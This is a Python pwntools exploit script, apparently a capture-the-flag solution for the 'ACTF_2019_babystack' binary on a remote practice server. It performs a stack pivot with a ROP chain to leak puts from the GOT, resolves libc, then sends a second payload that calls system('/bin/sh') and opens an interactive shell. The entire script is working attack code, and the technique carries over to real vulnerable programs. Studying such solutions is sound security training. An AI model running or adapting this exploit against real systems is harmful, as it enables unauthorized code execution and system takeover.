from pwn import *
from LibcSearcher import LibcSearcher
context(os='linux', arch='amd64', log_level='debug')
# io = process('./ACTF_2019_babystack')
io = remote('node4.buuoj.cn',26687)
elf = ELF('./ACTF_2019_babystack')




def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)

def bytes2int(content):
	return str(content,encoding='utf-8')


puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
leave_ret = 0x400A18
main_addr = 0x04008F6
pop_rdi_ret = 0x400ad3
ret_addr = 0x400A19
#第一次栈偏移，泄露libc
io.sendlineafter(b'>',b'224')
io.recvuntil(b'Your message will be saved at ')
buffer_addr = int(bytes2int(io.recv(14)),16)

payload = p64(0) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
payload = payload.ljust(0xd0,b'a') + p64(buffer_addr) + p64(leave_ret)
io.sendafter(b'>',payload)

io.recvuntil(b'Byebye~\n')
puts_addr = u64(io.recvuntil(b'\n',drop=True).ljust(8,b'\x00'))
log.success(hex(puts_addr))
system_addr,bin_sh_addr = ret2libc(puts_addr,'puts')

#第二次栈偏移，执行system，这里注意payload中有一个ret_addr，是Ubantu18要对齐
io.sendlineafter(b'>',b'224')
io.recvuntil(b'Your message will be saved at ')
buffer_addr = int(bytes2int(io.recv(14)),16)

payload = p64(0) + p64(ret_addr) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) + p64(main_addr)
payload = payload.ljust(0xd0,b'a') + p64(buffer_addr) + p64(leave_ret)
io.sendafter(b'>',payload)


io.interactive()